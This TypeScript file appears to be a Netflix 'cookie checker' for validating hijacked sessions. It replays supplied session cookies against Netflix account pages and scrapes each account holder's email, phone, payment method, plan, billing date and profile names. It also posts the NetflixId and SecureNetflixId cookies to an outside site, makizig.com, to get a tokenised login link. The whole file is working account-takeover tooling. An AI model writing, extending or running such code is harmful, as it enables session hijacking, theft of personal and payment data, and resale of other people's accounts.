import { log } from "./logger";

interface CookieObj {
  name: string;
  value: string;
  domain?: string;
  [key: string]: any;
}

const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

function cookiesToHeader(cookies: CookieObj[] | string): string {
  if (typeof cookies === "string") {
    try {
      const parsed = JSON.parse(cookies);
      if (Array.isArray(parsed)) {
        return parsed
          .filter((c: any) => c.name && c.value)
          .map((c: any) => `${c.name}=${c.value}`)
          .join("; ");
      }
    } catch {}
    return cookies;
  }
  if (Array.isArray(cookies)) {
    return cookies
      .filter((c) => c.name && c.value)
      .map((c) => `${c.name}=${c.value}`)
      .join("; ");
  }
  return String(cookies);
}

function decodeHexEscapes(str: string): string {
  let decoded = str;
  decoded = decoded.replace(/\\x([0-9a-fA-F]{2})/g, (_, code) =>
    String.fromCharCode(parseInt(code, 16))
  );
  decoded = decoded.replace(/\\u([0-9a-fA-F]{4})/g, (_, code) =>
    String.fromCharCode(parseInt(code, 16))
  );
  decoded = decoded.replace(/&#x([0-9a-fA-F]+);/g, (_, code) =>
    String.fromCharCode(parseInt(code, 16))
  );
  decoded = decoded.replace(/&#(\d+);/g, (_, code) =>
    String.fromCharCode(parseInt(code, 10))
  );
  const entities: Record<string, string> = {
    "&amp;": "&", "&lt;": "<", "&gt;": ">", "&quot;": '"', "&apos;": "'",
    "&atilde;": "ã", "&ntilde;": "ñ", "&eacute;": "é", "&iacute;": "í",
    "&oacute;": "ó", "&uacute;": "ú", "&ccedil;": "ç", "&Atilde;": "Ã",
    "&Ntilde;": "Ñ", "&Eacute;": "É", "&Iacute;": "Í", "&Oacute;": "Ó",
    "&Uacute;": "Ú", "&Ccedil;": "Ç", "&uuml;": "ü", "&ouml;": "ö",
    "&auml;": "ä", "&szlig;": "ß", "&agrave;": "à", "&egrave;": "è",
    "&nbsp;": " ",
  };
  for (const [entity, char] of Object.entries(entities)) {
    decoded = decoded.split(entity).join(char);
  }
  return decoded;
}

function extractNetflixCookies(setCookieHeaders: string[]): { netflixId: string | null; secureNetflixId: string | null } {
  let netflixId: string | null = null;
  let secureNetflixId: string | null = null;
  for (const sc of setCookieHeaders) {
    if (sc.startsWith("NetflixId=")) {
      netflixId = sc.match(/NetflixId=([^;]+)/)?.[1] || null;
    }
    if (sc.startsWith("SecureNetflixId=")) {
      secureNetflixId = sc.match(/SecureNetflixId=([^;]+)/)?.[1] || null;
    }
  }
  return { netflixId, secureNetflixId };
}

async function fetchWatchLinkFromMakizig(cookieHeader: string, netflixId?: string | null, secureNetflixId?: string | null): Promise<string | null> {
  const cookieToSend = (netflixId && secureNetflixId)
    ? `NetflixId=${netflixId}; SecureNetflixId=${secureNetflixId}`
    : cookieHeader;

  try {
    const formData = new URLSearchParams();
    formData.append("raw_cookie", cookieToSend);

    const r = await fetch("https://makizig.com/unli-netflix/", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": UA,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://makizig.com",
        "Referer": "https://makizig.com/unli-netflix/",
      },
      body: formData.toString(),
      signal: AbortSignal.timeout(30000),
    });

    const html = await r.text();
    const linkMatch = html.match(/<textarea id="hiddenLink"[^>]*>([\s\S]*?)<\/textarea>/);
    if (linkMatch) {
      const link = linkMatch[1].trim();
      if (link.includes("nftoken=")) {
        return link;
      }
    }
    return null;
  } catch (err: any) {
    log(`Makizig watch link fetch failed: ${err.message}`);
    return null;
  }
}

function regexExtract(html: string, pattern: RegExp): string | null {
  const match = html.match(pattern);
  return match?.[1]?.trim() || null;
}

function jsonPath(obj: any, ...keys: string[]): any {
  let current = obj;
  for (const key of keys) {
    if (current == null || typeof current !== "object") return undefined;
    current = current[key];
  }
  return current;
}

async function fetchWithRedirect(url: string, cookieHeader: string): Promise<{ html: string; finalUrl: string }> {
  let currentUrl = url;
  let maxRedirects = 5;

  while (maxRedirects > 0) {
    const res = await fetch(currentUrl, {
      method: "GET",
      headers: {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cookie": cookieHeader,
      },
      redirect: "manual",
    });

    if (res.status >= 300 && res.status < 400) {
      const location = res.headers.get("location");
      if (!location) break;
      currentUrl = location.startsWith("http") ? location : `https://www.netflix.com${location}`;
      maxRedirects--;
      continue;
    }

    const html = await res.text();
    return { html, finalUrl: currentUrl };
  }

  return { html: "", finalUrl: currentUrl };
}

export async function validateNetflixCookies(cookies: any): Promise<any> {
  const cookieHeader = cookiesToHeader(cookies);
  if (!cookieHeader || cookieHeader.length < 10) {
    return { valid: false, error: "Invalid cookie data" };
  }

  try {
    const initialRes = await fetch("https://www.netflix.com/YourAccount", {
      method: "GET",
      headers: {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cookie": cookieHeader,
      },
      redirect: "manual",
    });
    const setCookieHeaders = (initialRes.headers as any).getSetCookie?.() || [];
    const { netflixId, secureNetflixId } = extractNetflixCookies(setCookieHeaders);

    const { html: accountHtml, finalUrl: accountUrl } =
      await fetchWithRedirect("https://www.netflix.com/YourAccount", cookieHeader);

    if (accountUrl.includes("/login") || accountUrl.includes("/Login")) {
      return { valid: false, error: "Cookie is dead / expired" };
    }

    const hasReactContext = accountHtml.includes("netflix.reactContext");
    const hasAuthURL = /"authURL"\s*:/.test(accountHtml);
    const hasMemberStatus = /"membershipStatus"/.test(accountHtml);

    if (!hasReactContext && !hasAuthURL && !hasMemberStatus) {
      return { valid: false, error: "Cookie is dead / expired" };
    }

    let reactData: any = null;
    const reactMatch = accountHtml.match(/netflix\.reactContext\s*=\s*(\{[\s\S]*?\});\s*<\/script>/);
    if (reactMatch) {
      try {
        let jsonStr = reactMatch[1];
        jsonStr = jsonStr.replace(/\\x([0-9a-fA-F]{2})/g, (_, c) => {
          const charCode = parseInt(c, 16);
          if (charCode === 0x22) return '\\"';
          if (charCode === 0x5c) return '\\\\';
          return String.fromCharCode(charCode);
        });
        reactData = JSON.parse(jsonStr);
      } catch (e: any) {
        log(`reactContext parse error: ${e.message}`);
      }
    }

    const userInfo = reactData?.models?.userInfo?.data || {};
    const signupData = reactData?.models?.signupContext?.data?.flow?.fields || {};
    const currentPlan = signupData?.currentPlan?.fields || {};

    const plan = currentPlan?.localizedPlanName?.value ||
                 regexExtract(accountHtml, /"planName"\s*:\s*"([^"]+)"/) ||
                 regexExtract(accountHtml, /"localizedPlanName"[^}]*"value"\s*:\s*"([^"]+)"/);

    const price = currentPlan?.planPrice?.value ||
                  regexExtract(accountHtml, /"planPrice"[^}]*"value"\s*:\s*"([^"]+)"/);

    const email = userInfo.emailAddress ||
                  regexExtract(accountHtml, /"memberEmail"\s*:\s*"([^"]+)"/) ||
                  regexExtract(accountHtml, /"emailAddress"\s*:\s*"([^"]+)"/);

    const country = userInfo.countryOfSignup ||
                    userInfo.currentCountry ||
                    regexExtract(accountHtml, /"countryOfSignup"\s*:\s*"([^"]+)"/);

    const memberSince = userInfo.memberSince ||
                        regexExtract(accountHtml, /"memberSince"\s*:\s*"([^"]+)"/);

    const maxStreamsVal = currentPlan?.maxStreams?.value ||
                         regexExtract(accountHtml, /"maxStreams"[^}]*"value"\s*:\s*(\d+)/);
    const maxStreams = maxStreamsVal ? String(maxStreamsVal) : undefined;

    const videoQuality = currentPlan?.videoQuality?.value ||
                         regexExtract(accountHtml, /"videoQuality"[^}]*"value"\s*:\s*"([^"]+)"/);

    let paymentMethod: string | undefined;
    const paymentMethods = signupData?.paymentMethods?.value;
    if (Array.isArray(paymentMethods) && paymentMethods.length > 0) {
      const pm = paymentMethods[0]?.value;
      paymentMethod = pm?.paymentMethod?.value || pm?.type?.value;
    }
    if (!paymentMethod) {
      paymentMethod = regexExtract(accountHtml, /"paymentMethodType"\s*:\s*"([^"]+)"/) ||
                      regexExtract(accountHtml, /"paymentMethod"[^}]*"value"\s*:\s*"([^"]+)"/) ||
                      undefined;
    }

    let phone: string | undefined;
    const phoneVal = regexExtract(accountHtml, /"phoneNumber"\s*:\s*"([^"]+)"/);
    if (phoneVal) phone = decodeHexEscapes(phoneVal);

    const phoneVerified = regexExtract(accountHtml, /"phoneVerified"\s*:\s*(true|false)/);

    let emailVerified: string | undefined;
    const graphqlData = reactData?.models?.graphql?.data || {};
    for (const key of Object.keys(graphqlData)) {
      if (key.includes("Profile:")) {
        const profile = graphqlData[key];
        if (profile?.growthEmail?.isVerified !== undefined) {
          emailVerified = profile.growthEmail.isVerified ? "Yes" : "No";
          break;
        }
      }
    }
    if (!emailVerified) {
      const ev = regexExtract(accountHtml, /"emailVerified"\s*:\s*(true|false)/);
      emailVerified = ev === "true" ? "Yes" : ev === "false" ? "No" : undefined;
    }

    let profiles: string | undefined;
    const profileNames: string[] = [];

    const { html: browseHtml } =
      await fetchWithRedirect("https://www.netflix.com/browse", cookieHeader);

    const browseIsLogin = browseHtml.includes("/login") && !browseHtml.includes('"profileName"');
    const browseProfiles = browseIsLogin ? null : browseHtml.match(/"profileName"\s*:\s*"([^"]+)"/g);
    if (browseProfiles) {
      for (const p of browseProfiles) {
        const nm = p.match(/"profileName"\s*:\s*"([^"]+)"/);
        if (nm) profileNames.push(decodeHexEscapes(nm[1]));
      }
    }

    if (profileNames.length === 0) {
      const allProfiles = accountHtml.match(/"profileName"\s*:\s*"([^"]+)"/g);
      if (allProfiles) {
        for (const p of allProfiles) {
          const nm = p.match(/"profileName"\s*:\s*"([^"]+)"/);
          if (nm) profileNames.push(decodeHexEscapes(nm[1]));
        }
      }
    }

    const uniqueProfiles = Array.from(new Set(profileNames));
    if (uniqueProfiles.length > 0) {
      profiles = decodeHexEscapes(uniqueProfiles.join(", "));
    }

    const memberStatus = userInfo.membershipStatus ||
                         regexExtract(accountHtml, /"membershipStatus"\s*:\s*"([^"]+)"/);
    const isCancelled = memberStatus === "CANCELLED" || memberStatus === "CANCELED" ||
                        accountHtml.includes('"isCanceled":true');
    const status = isCancelled ? "Cancelled" : "Valid";

    let isExtraMember: string | undefined;
    const extraMemberVal = regexExtract(accountHtml, /"isExtraMember"\s*:\s*(true|false)/);
    if (extraMemberVal) {
      isExtraMember = extraMemberVal === "true" ? "Yes" : "No";
    }
    if (!isExtraMember) {
      const emField = signupData?.isExtraMember;
      if (emField !== undefined) {
        isExtraMember = emField?.value ? "Yes" : "No";
      }
    }

    const paymentHold = regexExtract(accountHtml, /"isPaymentHold"\s*:\s*(true|false)/);

    let nextBillingDate: string | undefined;
    const nbdField = signupData?.nextBillingDate;
    if (nbdField?.value) {
      nextBillingDate = String(nbdField.value);
    }
    if (!nextBillingDate) {
      nextBillingDate = regexExtract(accountHtml, /"nextBillingDate"[^}]*"value"\s*:\s*"([^"]+)"/) ||
                        regexExtract(accountHtml, /"nextBillingDate"\s*:\s*"([^"]+)"/) ||
                        undefined;
    }
    if (!nextBillingDate) {
      const nbdNum = regexExtract(accountHtml, /"nextBillingDate"[^}]*"value"\s*:\s*(\d{10,})/);
      if (nbdNum) {
        nextBillingDate = new Date(parseInt(nbdNum)).toISOString();
      }
    }

    const premium = plan?.toLowerCase().includes("premium") ? "Yes" :
                    plan?.toLowerCase().includes("standard") ? "Yes" :
                    plan?.toLowerCase().includes("basic") ? "No" :
                    plan ? "Yes" : undefined;

    let watchLink = await fetchWatchLinkFromMakizig(cookieHeader, netflixId, secureNetflixId);
    if (watchLink) {
      watchLink = watchLink.replace(/netflix\.com\/account\?/, "netflix.com/browse?");
    }

    const rawParts: string[] = [];
    if (plan) rawParts.push(`Plan: ${plan}`);
    if (country) rawParts.push(`Country: ${country}`);
    if (price) rawParts.push(`Price: ${price}`);
    if (email) rawParts.push(`\nEmail: ${email}`);
    if (profiles) rawParts.push(`\nProfiles: ${profiles}`);
    const rawData = rawParts.join(" | ");

    return {
      valid: true,
      status,
      premium,
      country: country?.toUpperCase(),
      plan: plan ? decodeHexEscapes(plan) : undefined,
      price: price ? decodeHexEscapes(price) : undefined,
      memberSince: memberSince ? decodeHexEscapes(memberSince) : undefined,
      paymentMethod,
      phone,
      phoneVerified: phoneVerified === "true" ? "Yes" : phoneVerified === "false" ? "No" : undefined,
      videoQuality,
      maxStreams,
      paymentHold: paymentHold === "true" ? "Yes" : paymentHold === "false" ? "No" : undefined,
      extraMember: isExtraMember,
      email,
      emailVerified,
      profiles,
      billing: nextBillingDate ? decodeHexEscapes(nextBillingDate) : undefined,
      watchLink: watchLink || undefined,
      rawData: rawData || undefined,
    };
  } catch (err: any) {
    log(`Netflix validation error: ${err.message}`);
    return { valid: false, error: "Failed to validate cookie" };
  }
}
